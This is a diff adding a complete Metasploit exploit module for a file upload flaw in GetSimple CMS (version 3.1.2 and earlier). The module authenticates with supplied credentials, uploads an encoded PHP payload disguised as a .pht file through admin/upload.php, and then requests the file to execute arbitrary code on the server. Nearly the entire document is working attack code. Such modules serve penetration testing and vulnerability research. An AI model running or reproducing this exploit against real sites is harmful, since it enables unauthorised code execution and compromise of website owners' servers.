@@ -1,0 +1,140 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'GetSimpleCMS PHP File Upload Vulnerability',
+      'Description'    => %q{
+        This module exploits a file upload vulnerability in GetSimple CMS. By abusing the
+        upload.php file, a malicious authenticated user can upload an arbitrary file,
+        including PHP code, which results in arbitrary code execution.
+      },
+      'Author'         =>
+        [
+          'Ahmed Elhady Mohamed'
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['EDB', '25405'],
+          ['OSVDB', '93034']
+        ],
+      'Payload'        =>
+        {
+          'BadChars' => "\x00",
+        },
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        =>
+        [
+          ['Generic (PHP Payload)', {}]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Jan 04 2014'
+    ))
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'The full URI path to GetSimplecms', '/GetSimpleCMS']),
+      OptString.new('USERNAME', [true, 'The username that will be used for authentication process']),
+      OptString.new('PASSWORD', [true, 'The right password for the provided username'])
+    ], self.class)
+  end
+
+  def send_request_auth
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path.to_s, "admin", "index.php"),
+      'vars_post' => {
+        'userid'    => "#{datastore['USERNAME']}",
+        'pwd'       => "#{datastore['PASSWORD']}",
+        'submitted' => 'Login'
+      }
+    })
+
+    res
+  end
+
+  def send_request_upload(payload_name, cookie_http_header)
+    data = Rex::MIME::Message.new
+    data.add_part("<?php #{payload.encoded} ?>", 'application/x-httpd-php', nil, "form-data; name=\"file[]\"; filename=\"#{payload_name}\"")
+    data.add_part("Upload", nil, nil, "form-data; name=\"submit\"")
+
+    data_post = data.to_s
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path.to_s, "admin", "upload.php"),
+      'vars_get' => { 'path' =>'' },
+      'cookie'   => cookie_http_header,
+      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
+      'data'     => data_post
+    })
+
+    res
+  end
+
+  def check
+    res = send_request_cgi({'uri' => normalize_uri(target_uri.path.to_s, 'admin', 'index.php')})
+
+    if res && res.code == 200 && res.body && res.body.to_s =~ /GetSimple CMS.*Version\s*([0-9\.]+)/
+      version = $1
+    else
+      return Exploit::CheckCode::Unknown
+    end
+
+    print_status("#{peer} - Version #{version} found")
+
+    if Gem::Version.new(version) <= Gem::Version.new('3.1.2')
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    print_status("#{peer} - Authenticating...")
+    res = send_request_auth
+
+    if res && res.code == 302
+      print_status("#{peer} - The authentication process is done successfully!")
+    else
+      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
+    end
+
+    print_status("#{peer} - Extracting Cookies Information...")
+    cookie = res.get_cookies
+    if cookie.blank?
+      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
+    end
+
+    print_status("#{peer} - Uploading payload...")
+    payload_name = rand_text_alpha_lower(rand(10) + 5) + '.pht'
+    res = send_request_upload(payload_name, cookie)
+
+    if res && res.code == 200 && res.body && res.body.to_s =~ /Success! File location.*>.*#{target_uri.path.to_s}(.*)#{payload_name}</
+      upload_path = $1
+      print_good("#{peer} - File uploaded to #{upload_path}")
+      register_file_for_cleanup(payload_name)
+    else
+      fail_with(Failure::Unknown, "#{peer} - Upload failed")
+    end
+
+    print_status("#{peer} - Executing payload...")
+    send_request_raw({
+      'uri' => normalize_uri(target_uri.path.to_s, upload_path, payload_name),
+      'method' => 'GET'
+    }, 5)
+  end
+
+end
